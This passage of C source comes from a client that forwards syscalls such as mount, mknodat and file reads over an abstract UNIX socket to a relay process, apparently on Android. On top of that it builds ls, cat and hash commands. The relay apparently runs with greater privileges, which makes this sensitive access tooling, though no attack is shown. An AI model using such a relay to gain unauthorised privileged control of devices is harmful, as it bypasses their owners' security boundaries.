    OVLOG("relay_mount: x0=off%llu('%s') x1=off%llu('%s') x2=off%llu('%s') x3=0x%lx x4=off%llu('%s')",
          (unsigned long long)x0_val, source ? source : "NULL",
          (unsigned long long)x1_val, target ? target : "NULL",
          (unsigned long long)x2_val, type ? type : "NULL",
          mflags,
          (unsigned long long)x4_val, options ? options : "NULL");
    OVLOG("relay_mount: dflags=0x%x (X0=%d X1=%d X2=%d X3=%d X4=%d)",
          dflags,
          !!(dflags & FLAG_X0_DATA), !!(dflags & FLAG_X1_DATA),
          !!(dflags & FLAG_X2_DATA), !!(dflags & (1u<<3)),
          !!(dflags & FLAG_X4_DATA));

    return send_syscall(sock, SYS_mount,
                        x0_val, x1_val, x2_val,
                        (uint64_t)mflags,   /* x3: integer flags, no rebase */
                        x4_val, 0,           /* x5: unused by mount() */
                        dflags,
                        dbuf, off,           /* send only the bytes we packed */
                        NULL, 0);
}

/* relay_mount_simple: mount with only a target path and integer flags.
 *
 * Used for propagation changes (MS_SHARED, MS_PRIVATE) and remounts where
 * the kernel expects mount(NULL, target, NULL, flags, NULL).  Only x1
 * carries a data pointer; x0, x2, x4 are all 0 (NULL). */
static int64_t relay_mount_simple(int sock,
                                  const char *target,    /* x1: mount point */
                                  unsigned long mflags)  /* x3: propagation/remount flags */
{
    size_t tlen = strlen(target) + 1;
    uint8_t dbuf[DATA_SIZE];
    memset(dbuf, 0, sizeof(dbuf));
    memcpy(dbuf, target, tlen);

    /* x0=0(NULL), x1=target(data offset 0), x2=0(NULL), x3=flags, x4=0(NULL)
     * Only FLAG_X1_DATA is set because only x1 is a data-buffer pointer. */
    return send_syscall(sock, SYS_mount,
                        0, 0, 0,
                        (uint64_t)mflags,
                        0, 0,
                        FLAG_X1_DATA,
                        dbuf, tlen,
                        NULL, 0);
}

static int64_t relay_ftruncate(int sock, int64_t fd, int64_t length) {
    return send_syscall(sock, SYS_ftruncate,
                        (uint64_t)fd, (uint64_t)length, 0,
                        0, 0, 0,
                        0, NULL, 0, NULL, 0);
}

static int64_t relay_lseek(int sock, int64_t fd, int64_t offset, int whence) {
    return send_syscall(sock, SYS_lseek,
                        (uint64_t)fd, (uint64_t)offset, (uint64_t)whence,
                        0, 0, 0,
                        0, NULL, 0, NULL, 0);
}

/* relay_ioctl available if needed:
static int64_t relay_ioctl(int sock, int64_t fd, unsigned long cmd, uint64_t arg) {
    return send_syscall(sock, SYS_ioctl,
                        (uint64_t)fd, (uint64_t)cmd, arg,
                        0, 0, 0,
                        0, NULL, 0, NULL, 0);
} */

static int64_t relay_inotify_init1(int sock, int flags) {
    return send_syscall(sock, SYS_inotify_init1,
                        (uint64_t)flags, 0, 0, 0, 0, 0,
                        0, NULL, 0, NULL, 0);
}

static int64_t relay_inotify_add_watch(int sock, int64_t ifd, const char *path, uint32_t mask) {
    size_t plen = strlen(path) + 1;
    uint8_t dbuf[DATA_SIZE];
    memset(dbuf, 0, sizeof(dbuf));
    memcpy(dbuf, path, plen);
    return send_syscall(sock, SYS_inotify_add_watch,
                        (uint64_t)ifd, 0, (uint64_t)mask, 0, 0, 0,
                        FLAG_X1_DATA,
                        dbuf, plen, NULL, 0);
}

static int64_t relay_mknodat(int sock, const char *path, uint32_t mode, uint64_t dev) {
    size_t plen = strlen(path) + 1;
    uint8_t dbuf[DATA_SIZE];
    memset(dbuf, 0, sizeof(dbuf));
    memcpy(dbuf, path, plen);
    return send_syscall(sock, SYS_mknodat,
                        MY_AT_FDCWD, 0, (uint64_t)mode, dev, 0, 0,
                        FLAG_X1_DATA,
                        dbuf, plen, NULL, 0);
}

static int64_t relay_lgetxattr(int sock, const char *path, const char *name,
                                void *value, size_t vsize) {
    size_t plen = strlen(path) + 1;
    size_t p_padded = (plen + 7) & ~(size_t)7;
    size_t nlen = strlen(name) + 1;
    size_t n_padded = (nlen + 7) & ~(size_t)7;
    if (p_padded + n_padded + vsize > DATA_SIZE) return -22;

    uint8_t dbuf[DATA_SIZE];
    memset(dbuf, 0, sizeof(dbuf));
    memcpy(dbuf, path, plen);
    memcpy(dbuf + p_padded, name, nlen);

    int64_t ret = send_syscall(sock, SYS_lgetxattr,
                               0, (uint64_t)p_padded,
                               (uint64_t)(p_padded + n_padded), (uint64_t)vsize,
                               0, 0,
                               FLAG_X0_DATA | FLAG_X1_DATA | FLAG_X2_DATA,
                               dbuf, p_padded + n_padded + vsize,
                               dbuf, p_padded + n_padded + vsize);
    if (ret > 0 && value) {
        size_t copy = ((size_t)ret < vsize) ? (size_t)ret : vsize;
        memcpy(value, dbuf + p_padded + n_padded, copy);
    }
    return ret;
}

/* ═══════════════════════════════════════════════════════════════════════════
 * Path resolution
 * ═══════════════════════════════════════════════════════════════════════════ */

/*
 * resolve_path — Convert a possibly-relative path to absolute using g_cwd.
 * Handles . and .. components. Result written to 'out' (must be CWD_SIZE).
 */
static void resolve_path(const char *input, char *out) {
    char tmp[CWD_SIZE];

    if (input[0] == '/') {
        /* Absolute path */
        strncpy(tmp, input, CWD_SIZE - 1);
        tmp[CWD_SIZE - 1] = '\0';
    } else {
        /* Relative to CWD */
        size_t cwdlen = strlen(g_cwd);
        if (cwdlen > 0 && g_cwd[cwdlen - 1] == '/') {
            snprintf(tmp, CWD_SIZE, "%s%s", g_cwd, input);
        } else {
            snprintf(tmp, CWD_SIZE, "%s/%s", g_cwd, input);
        }
    }

    /* Normalize: resolve . and .. and collapse // */
    char *components[256];
    int depth = 0;

    char *p = tmp;
    while (*p) {
        while (*p == '/') p++;
        if (*p == '\0') break;

        char *start = p;
        while (*p && *p != '/') p++;
        if (*p == '/') *p++ = '\0';

        if (strcmp(start, ".") == 0) {
            /* skip */
        } else if (strcmp(start, "..") == 0) {
            if (depth > 0) depth--;
        } else {
            if (depth < 256) {
                components[depth++] = start;
            }
        }
    }

    if (depth == 0) {
        strcpy(out, "/");
        return;
    }

    out[0] = '\0';
    for (int i = 0; i < depth; i++) {
        size_t cur = strlen(out);
        snprintf(out + cur, CWD_SIZE - cur, "/%s", components[i]);
    }
}

/* ═══════════════════════════════════════════════════════════════════════════
 * Shared file-reading helpers
 * ═══════════════════════════════════════════════════════════════════════════ */

/*
 * relay_read_file — Read entire file into malloc'd buffer. Caller must free().
 * Returns total bytes read, or -1 on error. Sets *out to allocated buffer.
 * Max read: max_sz bytes (pass 0 for default 4MB).
 */
static ssize_t relay_read_file(int sock, const char *path, uint8_t **out, size_t max_sz) {
    if (max_sz == 0) max_sz = 4 * 1024 * 1024;

    int64_t fd = relay_openat(sock, path, MY_O_RDONLY, 0);
    if (fd < 0) {
        *out = NULL;
        return -(int)(-fd);
    }

    size_t capacity = 32768;
    uint8_t *buf = (uint8_t *)malloc(capacity);
    if (!buf) {
        relay_close(sock, fd);
        *out = NULL;
        return -12;
    }

    size_t total = 0;
    for (;;) {
        if (g_sigint) break;
        if (total >= max_sz) break;

        size_t want = DATA_SIZE;
        if (total + want > capacity) {
            size_t newcap = capacity * 2;
            if (newcap > max_sz) newcap = max_sz;
            uint8_t *nb = (uint8_t *)realloc(buf, newcap);
            if (!nb) break;
            buf = nb;
            capacity = newcap;
        }

        int64_t n = relay_read(sock, fd, buf + total, want);
        if (n <= 0) break;
        total += (size_t)n;
        if ((size_t)n < want) break;
    }

    relay_close(sock, fd);

    /* M11: Ensure buffer has room for callers that do data[sz] = '\0'.
     * Many callers NUL-terminate immediately after the returned size,
     * so we need total+1 bytes allocated. */
    if (total >= capacity) {
        uint8_t *nb = (uint8_t *)realloc(buf, total + 1);
        if (nb) buf = nb;
        /* If realloc fails, total < original capacity is still safe
         * because the loop above stopped at capacity boundary. */
    }

    *out = buf;
    return (ssize_t)total;
}

/*
 * relay_cat_file — Read and print file to stdout. Returns 0 on success.
 */
static int relay_cat_file(int sock, const char *path) {
    int64_t fd = relay_openat(sock, path, MY_O_RDONLY, 0);
    if (fd < 0) return (int)(-fd);

    for (;;) {
        if (g_sigint) break;
        uint8_t buf[DATA_SIZE];
        int64_t n = relay_read(sock, fd, buf, DATA_SIZE);
        if (n <= 0) break;
        fwrite(buf, 1, (size_t)n, stdout);
        if ((size_t)n < DATA_SIZE) break;
    }

    relay_close(sock, fd);
    fflush(stdout);
    return 0;
}

/* count_lines available if needed: counts newlines in buffer */

/*
 * fnmatch_simple — Simple glob pattern matching (*, ?).
 */
static int fnmatch_simple(const char *pattern, const char *string) {
    while (*pattern) {
        if (*pattern == '*') {
            pattern++;
            if (*pattern == '\0') return 1;
            while (*string) {
                if (fnmatch_simple(pattern, string)) return 1;
                string++;
            }
            return 0;
        } else if (*pattern == '?') {
            if (*string == '\0') return 0;
            pattern++;
            string++;
        } else {
            if (*pattern != *string) return 0;
            pattern++;
            string++;
        }
    }
    return (*string == '\0');
}

/* ═══════════════════════════════════════════════════════════════════════════
 * Socket connection with reconnect
 * ═══════════════════════════════════════════════════════════════════════════ */

static int connect_relay(void) {
    int sock = socket(AF_UNIX, SOCK_STREAM, 0);
    if (sock < 0) {
        fprintf(stderr, "relay: socket(): %s\n", strerror(errno));
        return -1;
    }

    struct sockaddr_un addr;
    memset(&addr, 0, sizeof(addr));
    addr.sun_family = AF_UNIX;
    memcpy(addr.sun_path + 1, SOCKET_NAME, sizeof(SOCKET_NAME) - 1);
    socklen_t addrlen = (socklen_t)(2 + 1 + sizeof(SOCKET_NAME) - 1);

    if (connect(sock, (struct sockaddr *)&addr, addrlen) < 0) {
        fprintf(stderr, "relay: connect(@%s): %s\n", SOCKET_NAME, strerror(errno));
        close(sock);
        return -1;
    }

    return sock;
}

static int connect_with_retry(void) {
    for (int attempt = 0; attempt < RECONNECT_MAX; attempt++) {
        int sock = connect_relay();
        if (sock >= 0) return sock;
        if (attempt < RECONNECT_MAX - 1) {
            fprintf(stderr, "Retrying in 1 second... (%d/%d)\n",
                    attempt + 2, RECONNECT_MAX);
            sleep(1);
        }
    }
    return -1;
}

/* ═══════════════════════════════════════════════════════════════════════════
 * Argument parsing
 * ═══════════════════════════════════════════════════════════════════════════ */

static char *trim(char *s) {
    while (*s == ' ' || *s == '\t' || *s == '\n' || *s == '\r') s++;
    if (*s == '\0') return s;
    char *end = s + strlen(s) - 1;
    while (end > s && (*end == ' ' || *end == '\t' || *end == '\n' || *end == '\r'))
        *end-- = '\0';
    return s;
}

/*
 * Parse command line into argc/argv style. Handles double-quoted strings.
 * Returns number of tokens. Tokens stored in argv[] (max MAX_ARGS).
 * WARNING: modifies 'line' in place.
 */
static int parse_args(char *line, char *argv[]) {
    int argc = 0;
    char *p = line;

    while (*p && argc < MAX_ARGS) {
        while (*p == ' ' || *p == '\t') p++;
        if (*p == '\0') break;

        if (*p == '"') {
            p++;
            argv[argc++] = p;
            while (*p && *p != '"') p++;
            if (*p == '"') *p++ = '\0';
        } else if (*p == '\'') {
            p++;
            argv[argc++] = p;
            while (*p && *p != '\'') p++;
            if (*p == '\'') *p++ = '\0';
        } else {
            argv[argc++] = p;
            while (*p && *p != ' ' && *p != '\t') p++;
            if (*p) *p++ = '\0';
        }
    }

    return argc;
}

/*
 * Check if a string matches a redirect operator. Returns:
 *   0 = not a redirect
 *   1 = '>' (truncate)
 *   2 = '>>' (append)
 */
static int check_redirect(const char *s) {
    if (s[0] == '>' && s[1] == '>') return 2;
    if (s[0] == '>') return 1;
    return 0;
}

/*
 * Scan argv for redirect operator. Returns index of '>' or '>>' token,
 * or -1 if not found. Sets *redir_type to 1 (truncate) or 2 (append).
 */
static int find_redirect(int argc, char *argv[], int *redir_type) {
    for (int i = 0; i < argc; i++) {
        int r = check_redirect(argv[i]);
        if (r > 0) {
            *redir_type = r;
            return i;
        }
    }
    *redir_type = 0;
    return -1;
}

/* ═══════════════════════════════════════════════════════════════════════════
 * Stat formatting helpers
 * ═══════════════════════════════════════════════════════════════════════════ */

/* ARM64 struct stat layout:
 * offset 0:  st_dev    (8)
 * offset 8:  st_ino    (8)
 * offset 16: st_mode   (4)
 * offset 20: st_nlink  (4)
 * offset 24: st_uid    (4)
 * offset 28: st_gid    (4)
 * offset 32: st_rdev   (8)
 * offset 40: padding   (8)
 * offset 48: st_size   (8)
 * offset 56: st_blksize(4)
 * offset 60: padding   (4)
 * offset 64: st_blocks (8)
 * offset 72: st_atime  (8)
 * offset 80: st_atime_ns(8)
 * offset 88: st_mtime  (8)
 * offset 96: st_mtime_ns(8)
 */

static void format_mode(uint32_t mode, char *out) {
    /* File type */
    switch (mode & 0xF000) {
        case 0x4000: out[0] = 'd'; break;
        case 0x8000: out[0] = '-'; break;
        case 0xA000: out[0] = 'l'; break;
        case 0x2000: out[0] = 'c'; break;
        case 0x6000: out[0] = 'b'; break;
        case 0xC000: out[0] = 's'; break;
        case 0x1000: out[0] = 'p'; break;
        default:     out[0] = '?'; break;
    }
    /* Owner */
    out[1] = (mode & 0400) ? 'r' : '-';
    out[2] = (mode & 0200) ? 'w' : '-';
    out[3] = (mode & 0100) ? ((mode & 04000) ? 's' : 'x') : ((mode & 04000) ? 'S' : '-');
    /* Group */
    out[4] = (mode & 040)  ? 'r' : '-';
    out[5] = (mode & 020)  ? 'w' : '-';
    out[6] = (mode & 010)  ? ((mode & 02000) ? 's' : 'x') : ((mode & 02000) ? 'S' : '-');
    /* Other */
    out[7] = (mode & 04)   ? 'r' : '-';
    out[8] = (mode & 02)   ? 'w' : '-';
    out[9] = (mode & 01)   ? ((mode & 01000) ? 't' : 'x') : ((mode & 01000) ? 'T' : '-');
    out[10] = '\0';
}

static void format_time(uint64_t epoch, char *out, size_t outsz) {
    time_t t = (time_t)epoch;
    struct tm *tm = localtime(&t);
    if (tm) {
        strftime(out, outsz, "%Y-%m-%d %H:%M", tm);
    } else {
        snprintf(out, outsz, "%llu", (unsigned long long)epoch);
    }
}

static void format_size_human(uint64_t sz, char *out, size_t outsz) {
    if (sz < 1024) {
        snprintf(out, outsz, "%llu", (unsigned long long)sz);
    } else if (sz < 1024 * 1024) {
        snprintf(out, outsz, "%.1fK", (double)sz / 1024.0);
    } else if (sz < 1024ULL * 1024 * 1024) {
        snprintf(out, outsz, "%.1fM", (double)sz / (1024.0 * 1024.0));
    } else {
        snprintf(out, outsz, "%.1fG", (double)sz / (1024.0 * 1024.0 * 1024.0));
    }
}


/* ═══════════════════════════════════════════════════════════════════════════
 * Android UID/GID name table (from android_filesystem_config.h)
 * ═══════════════════════════════════════════════════════════════════════════ */

static const struct { uint32_t id; const char *name; } android_ids[] = {
    {0, "root"}, {1000, "system"}, {1001, "radio"}, {1002, "bluetooth"},
    {1003, "graphics"}, {1004, "input"}, {1005, "audio"}, {1006, "camera"},
    {1007, "log"}, {1008, "compass"}, {1009, "mount"}, {1010, "wifi"},
    {1011, "adb"}, {1012, "install"}, {1013, "media"}, {1014, "dhcp"},
    {1015, "sdcard_rw"}, {1016, "vpn"}, {1017, "keystore"}, {1018, "usb"},
    {1019, "drm"}, {1020, "mdnsr"}, {1021, "gps"}, {1023, "media_rw"},
    {1024, "mtp"}, {1026, "drmrpc"}, {1027, "nfc"}, {1028, "sdcard_r"},
    {1029, "clat"}, {1030, "loop_radio"}, {1031, "mediadrm"}, {1032, "package_info"},
    {1033, "sdcard_pics"}, {1034, "sdcard_av"}, {1035, "sdcard_all"},
    {1036, "logd"}, {1037, "shared_relro"}, {1038, "dbus"}, {1039, "tlsdate"},
    {1040, "mediaex"}, {1041, "audioserver"}, {1042, "metrics_coll"},
    {1043, "metricsd"}, {1044, "webserv"}, {1045, "debuggerd"},
    {1046, "mediacodec"}, {1047, "cameraserver"}, {1048, "firewall"},
    {1049, "trunks"}, {1050, "nvram"}, {1051, "dns"}, {1052, "dns_tether"},
    {1053, "webview_zygote"}, {1054, "vehicle_network"}, {1055, "media_audio"},
    {1056, "media_video"}, {1057, "media_image"}, {1058, "tombstoned"},
    {1059, "media_obb"}, {1060, "ese"}, {1061, "ota_update"},
    {1065, "contexthub"}, {1066, "incidentd"}, {1067, "secure_element"},
    {1068, "lmkd"}, {1069, "llkd"}, {1070, "iorapd"},
    {1072, "gpu_service"}, {1073, "network_stack"},
    {1074, "gsid"}, {1075, "fsverity_cert"}, {1076, "credstore"},
    {1077, "external_storage"}, {1078, "ext_data_rw"}, {1079, "ext_obb_rw"},
    {2000, "shell"}, {2001, "cache"}, {2002, "diag"},
    {3001, "net_bt_admin"}, {3002, "net_bt"}, {3003, "inet"},
    {3004, "net_raw"}, {3005, "net_admin"}, {3006, "net_bw_stats"},
    {3007, "net_bw_acct"}, {3009, "readproc"}, {3010, "wakelock"},
    {3011, "uhid"},
    {9997, "everybody"}, {9998, "misc"}, {9999, "nobody"},
    {0xFFFFFFFF, NULL}
};

static const char *uid_name(uint32_t id) {
    for (int i = 0; android_ids[i].name; i++) {
        if (android_ids[i].id == id) return android_ids[i].name;
    }
    return NULL;
}

/* SHA-256 implementation (for sha256sum command) */
static void sha256_transform(uint32_t state[8], const uint8_t block[64]) {
    static const uint32_t K[64] = {
        0x428a2f98,0x71374491,0xb5c0fbcf,0xe9b5dba5,0x3956c25b,0x59f111f1,0x923f82a4,0xab1c5ed5,
        0xd807aa98,0x12835b01,0x243185be,0x550c7dc3,0x72be5d74,0x80deb1fe,0x9bdc06a7,0xc19bf174,
        0xe49b69c1,0xefbe4786,0x0fc19dc6,0x240ca1cc,0x2de92c6f,0x4a7484aa,0x5cb0a9dc,0x76f988da,
        0x983e5152,0xa831c66d,0xb00327c8,0xbf597fc7,0xc6e00bf3,0xd5a79147,0x06ca6351,0x14292967,
        0x27b70a85,0x2e1b2138,0x4d2c6dfc,0x53380d13,0x650a7354,0x766a0abb,0x81c2c92e,0x92722c85,
        0xa2bfe8a1,0xa81a664b,0xc24b8b70,0xc76c51a3,0xd192e819,0xd6990624,0xf40e3585,0x106aa070,
        0x19a4c116,0x1e376c08,0x2748774c,0x34b0bcb5,0x391c0cb3,0x4ed8aa4a,0x5b9cca4f,0x682e6ff3,
        0x748f82ee,0x78a5636f,0x84c87814,0x8cc70208,0x90befffa,0xa4506ceb,0xbef9a3f7,0xc67178f2
    };
    #define RR(x,n) (((x)>>(n))|((x)<<(32-(n))))
    #define CH(x,y,z) (((x)&(y))^((~(x))&(z)))
    #define MAJ(x,y,z) (((x)&(y))^((x)&(z))^((y)&(z)))
    #define EP0(x) (RR(x,2)^RR(x,13)^RR(x,22))
    #define EP1(x) (RR(x,6)^RR(x,11)^RR(x,25))
    #define SIG0(x) (RR(x,7)^RR(x,18)^((x)>>3))
    #define SIG1(x) (RR(x,17)^RR(x,19)^((x)>>10))
    uint32_t W[64], a,b,c,d,e,f,g,h,t1,t2;
    for (int i = 0; i < 16; i++)
        W[i] = ((uint32_t)block[i*4]<<24)|((uint32_t)block[i*4+1]<<16)|
               ((uint32_t)block[i*4+2]<<8)|(uint32_t)block[i*4+3];
    for (int i = 16; i < 64; i++)
        W[i] = SIG1(W[i-2]) + W[i-7] + SIG0(W[i-15]) + W[i-16];
    a=state[0]; b=state[1]; c=state[2]; d=state[3];
    e=state[4]; f=state[5]; g=state[6]; h=state[7];
    for (int i = 0; i < 64; i++) {
        t1 = h + EP1(e) + CH(e,f,g) + K[i] + W[i];
        t2 = EP0(a) + MAJ(a,b,c);
        h=g; g=f; f=e; e=d+t1; d=c; c=b; b=a; a=t1+t2;
    }
    state[0]+=a; state[1]+=b; state[2]+=c; state[3]+=d;
    state[4]+=e; state[5]+=f; state[6]+=g; state[7]+=h;
    #undef RR
    #undef CH
    #undef MAJ
    #undef EP0
    #undef EP1
    #undef SIG0
    #undef SIG1
}

typedef struct { uint32_t state[8]; uint64_t bitlen; uint8_t buf[64]; uint32_t buflen; } sha256_ctx;

static void sha256_init(sha256_ctx *ctx) {
    ctx->state[0]=0x6a09e667; ctx->state[1]=0xbb67ae85;
    ctx->state[2]=0x3c6ef372; ctx->state[3]=0xa54ff53a;
    ctx->state[4]=0x510e527f; ctx->state[5]=0x9b05688c;
    ctx->state[6]=0x1f83d9ab; ctx->state[7]=0x5be0cd19;
    ctx->bitlen = 0; ctx->buflen = 0;
}

static void sha256_update(sha256_ctx *ctx, const uint8_t *data, size_t len) {
    for (size_t i = 0; i < len; i++) {
        ctx->buf[ctx->buflen++] = data[i];
        if (ctx->buflen == 64) {
            sha256_transform(ctx->state, ctx->buf);
            ctx->bitlen += 512;
            ctx->buflen = 0;
        }
    }
}

static void sha256_final(sha256_ctx *ctx, uint8_t hash[32]) {
    uint32_t i = ctx->buflen;
    ctx->buf[i++] = 0x80;
    if (i > 56) {
        while (i < 64) ctx->buf[i++] = 0;
        sha256_transform(ctx->state, ctx->buf);
        i = 0;
    }
    while (i < 56) ctx->buf[i++] = 0;
    ctx->bitlen += (uint64_t)ctx->buflen * 8;
    ctx->buf[63] = (uint8_t)(ctx->bitlen); ctx->buf[62] = (uint8_t)(ctx->bitlen >> 8);
    ctx->buf[61] = (uint8_t)(ctx->bitlen >> 16); ctx->buf[60] = (uint8_t)(ctx->bitlen >> 24);
    ctx->buf[59] = (uint8_t)(ctx->bitlen >> 32); ctx->buf[58] = (uint8_t)(ctx->bitlen >> 40);
    ctx->buf[57] = (uint8_t)(ctx->bitlen >> 48); ctx->buf[56] = (uint8_t)(ctx->bitlen >> 56);
    sha256_transform(ctx->state, ctx->buf);
    for (int j = 0; j < 8; j++) {
        hash[j*4]   = (uint8_t)(ctx->state[j] >> 24);
        hash[j*4+1] = (uint8_t)(ctx->state[j] >> 16);
        hash[j*4+2] = (uint8_t)(ctx->state[j] >> 8);
        hash[j*4+3] = (uint8_t)(ctx->state[j]);
    }
}

/* MD5 implementation (for md5sum command) */
static void md5_transform(uint32_t state[4], const uint8_t block[64]) {
    static const uint32_t S[64] = {
        7,12,17,22,7,12,17,22,7,12,17,22,7,12,17,22,
        5,9,14,20,5,9,14,20,5,9,14,20,5,9,14,20,
        4,11,16,23,4,11,16,23,4,11,16,23,4,11,16,23,
        6,10,15,21,6,10,15,21,6,10,15,21,6,10,15,21
    };
    static const uint32_t KK[64] = {
        0xd76aa478,0xe8c7b756,0x242070db,0xc1bdceee,0xf57c0faf,0x4787c62a,0xa8304613,0xfd469501,
        0x698098d8,0x8b44f7af,0xffff5bb1,0x895cd7be,0x6b901122,0xfd987193,0xa679438e,0x49b40821,
        0xf61e2562,0xc040b340,0x265e5a51,0xe9b6c7aa,0xd62f105d,0x02441453,0xd8a1e681,0xe7d3fbc8,
        0x21e1cde6,0xc33707d6,0xf4d50d87,0x455a14ed,0xa9e3e905,0xfcefa3f8,0x676f02d9,0x8d2a4c8a,
        0xfffa3942,0x8771f681,0x6d9d6122,0xfde5380c,0xa4beea44,0x4bdecfa9,0xf6bb4b60,0xbebfbc70,
        0x289b7ec6,0xeaa127fa,0xd4ef3085,0x04881d05,0xd9d4d039,0xe6db99e5,0x1fa27cf8,0xc4ac5665,
        0xf4292244,0x432aff97,0xab9423a7,0xfc93a039,0x655b59c3,0x8f0ccc92,0xffeff47d,0x85845dd1,
        0x6fa87e4f,0xfe2ce6e0,0xa3014314,0x4e0811a1,0xf7537e82,0xbd3af235,0x2ad7d2bb,0xeb86d391
    };
    #define LR(x,n) (((x)<<(n))|((x)>>(32-(n))))
    uint32_t M[16], A=state[0], B=state[1], C=state[2], D=state[3];
    for (int i = 0; i < 16; i++)
        M[i] = (uint32_t)block[i*4] | ((uint32_t)block[i*4+1]<<8) |
               ((uint32_t)block[i*4+2]<<16) | ((uint32_t)block[i*4+3]<<24);
    for (int i = 0; i < 64; i++) {
        uint32_t F, g;
        if (i < 16) { F = (B&C)|((~B)&D); g = (uint32_t)i; }
        else if (i < 32) { F = (D&B)|((~D)&C); g = (5*(uint32_t)i+1)%16; }
        else if (i < 48) { F = B^C^D; g = (3*(uint32_t)i+5)%16; }
        else { F = C^(B|(~D)); g = (7*(uint32_t)i)%16; }
        F = F + A + KK[i] + M[g];
        A = D; D = C; C = B; B = B + LR(F, S[i]);
    }
    state[0]+=A; state[1]+=B; state[2]+=C; state[3]+=D;
    #undef LR
}

typedef struct { uint32_t state[4]; uint64_t bitlen; uint8_t buf[64]; uint32_t buflen; } md5_ctx;

static void md5_init(md5_ctx *ctx) {
    ctx->state[0]=0x67452301; ctx->state[1]=0xefcdab89;
    ctx->state[2]=0x98badcfe; ctx->state[3]=0x10325476;
    ctx->bitlen = 0; ctx->buflen = 0;
}

static void md5_update(md5_ctx *ctx, const uint8_t *data, size_t len) {
    for (size_t i = 0; i < len; i++) {
        ctx->buf[ctx->buflen++] = data[i];
        if (ctx->buflen == 64) {
            md5_transform(ctx->state, ctx->buf);
            ctx->bitlen += 512;
            ctx->buflen = 0;
        }
    }
}

static void md5_final(md5_ctx *ctx, uint8_t hash[16]) {
    uint32_t i = ctx->buflen;
    ctx->buf[i++] = 0x80;
    if (i > 56) {
        while (i < 64) ctx->buf[i++] = 0;
        md5_transform(ctx->state, ctx->buf);
        i = 0;
    }
    while (i < 56) ctx->buf[i++] = 0;
    ctx->bitlen += (uint64_t)ctx->buflen * 8;
    ctx->buf[56] = (uint8_t)(ctx->bitlen); ctx->buf[57] = (uint8_t)(ctx->bitlen >> 8);
    ctx->buf[58] = (uint8_t)(ctx->bitlen >> 16); ctx->buf[59] = (uint8_t)(ctx->bitlen >> 24);
    ctx->buf[60] = (uint8_t)(ctx->bitlen >> 32); ctx->buf[61] = (uint8_t)(ctx->bitlen >> 40);
    ctx->buf[62] = (uint8_t)(ctx->bitlen >> 48); ctx->buf[63] = (uint8_t)(ctx->bitlen >> 56);
    md5_transform(ctx->state, ctx->buf);
    for (int j = 0; j < 4; j++) {
        hash[j*4]   = (uint8_t)(ctx->state[j]);
        hash[j*4+1] = (uint8_t)(ctx->state[j] >> 8);
        hash[j*4+2] = (uint8_t)(ctx->state[j] >> 16);
        hash[j*4+3] = (uint8_t)(ctx->state[j] >> 24);
    }
}

/* Inotify event mask bits */
#define IN_ACCESS        0x00000001
#define IN_MODIFY        0x00000002
#define IN_ATTRIB        0x00000004
#define IN_CLOSE_WRITE   0x00000008
#define IN_CLOSE_NOWRITE 0x00000010
#define IN_OPEN          0x00000020
#define IN_MOVED_FROM    0x00000040
#define IN_MOVED_TO      0x00000080
#define IN_CREATE        0x00000100
#define IN_DELETE         0x00000200
#define IN_DELETE_SELF   0x00000400
#define IN_MOVE_SELF     0x00000800
#define IN_ALL_EVENTS    0x00000FFF
#define IN_NONBLOCK      0x00000800

/* Block device ioctl */
#define BLKGETSIZE64 0x80081272
#define BLKSSZGET    0x1268
#define BLKROGET     0x125E

/* Loop device ioctl */
#define LOOP_GET_STATUS64  0x4C05

/* ═══════════════════════════════════════════════════════════════════════════
 * COMMANDS — Original set
 * ═══════════════════════════════════════════════════════════════════════════ */

struct dirent_entry {
    char name[256];
    uint8_t dtype;
};

/* ── ls: full toybox-equivalent implementation ─────────────────────────────
 *
 * Supports: -1ACFHLNRSUXZabcdfghiklmnopqrstuwx --color[=auto|always|never]
 *
 * struct ls_entry holds cached stat data so we stat each entry at most once.
 * ls_flags packs all boolean options into a single struct passed by pointer.
 * ──────────────────────────────────────────────────────────────────────────── */

struct ls_entry {
    char name[256];
    char link_target[256];
    uint8_t dtype;           /* from dirent d_type */
    int has_stat;
    uint32_t st_mode;
    uint32_t st_nlink;
    uint32_t st_uid;
    uint32_t st_gid;
    uint64_t st_dev;
    uint64_t st_ino;
    uint64_t st_rdev;
    uint64_t st_size;
    uint64_t st_blocks;
    uint64_t st_atime;
    uint64_t st_mtime;
    uint64_t st_ctime;
    uint64_t st_mtime_nsec;
    int has_link_target;
};

/* All ls flags packed together */
struct ls_flags {
    int fmt_long;            /* -l */
    int fmt_one;             /* -1 (one per line, default in relay) */
    int fmt_columns;         /* -C (vertical columns) */
    int fmt_across;          /* -x (horizontal columns) */
    int fmt_comma;           /* -m (comma-separated) */
    int show_all;            /* -a (include . and ..) */
    int show_almost_all;     /* -A (all except . and ..) */
    int show_inode;          /* -i */
    int show_blocks;         /* -s */
    int show_selinux;        /* -Z */
    int append_type;         /* -F (type indicators: / * @ | =) */
    int append_slash;        /* -p (/ after dirs only) */
    int human_readable;      /* -h */
    int no_owner;            /* -g (like -l but no owner) */
    int no_group;            /* -o (like -l but no group) */
    int numeric_ids;         /* -n (numeric UID/GID — already default) */
    int escape_nongraphic;   /* -b (C-style escapes) */
    int unprintable_q;       /* -q (replace non-printable with ?) */
    int no_escape;           /* -N (no escaping) */
    int dir_itself;          /* -d (list directory, not contents) */
    int unsorted;            /* -f (no sort, implies -a) */
    int follow_symlinks;     /* -L (follow all symlinks) */
    int follow_cmdline;      /* -H (follow command-line symlinks) */
    int recursive;           /* -R */
    int sort_size;           /* -S */
    int sort_time;           /* -t */
    int sort_ext;            /* -X (sort by extension) */
    int sort_none;           /* -U (no sort, directory order) */
    int sort_reverse;        /* -r */
    int time_ctime;          /* -c (use ctime) */
    int time_atime;          /* -u (use atime) */
    int color;               /* --color: 0=never, 1=always, 2=auto */
    int col_width;           /* -w N (column width override) */
    int block_size;          /* --block-size N */
    int full_time;           /* -ll (long with nanoseconds) */
    int group_dirs_first;    /* ! or --group-directories-first */
};

/* ── ls helpers ──────────────────────────────────────────────────────────── */

static void ls_make_full_path(const char *dir, const char *name, char *out) {
    size_t dlen = strlen(dir);
    if (dlen > 0 && dir[dlen - 1] == '/')
        snprintf(out, CWD_SIZE, "%s%s", dir, name);
    else
        snprintf(out, CWD_SIZE, "%s/%s", dir, name);
}

/* Stat an entry into ls_entry fields. Uses lstat (AT_SYMLINK_NOFOLLOW)
 * unless follow_symlinks is set. */
static int ls_stat_entry(int sock, const char *full_path,
                         struct ls_entry *e, int follow_symlinks) {
    uint8_t statbuf[128];
    memset(statbuf, 0, sizeof(statbuf));
    uint64_t flags = follow_symlinks ? 0 : MY_AT_SYMLINK_NOFOLLOW;
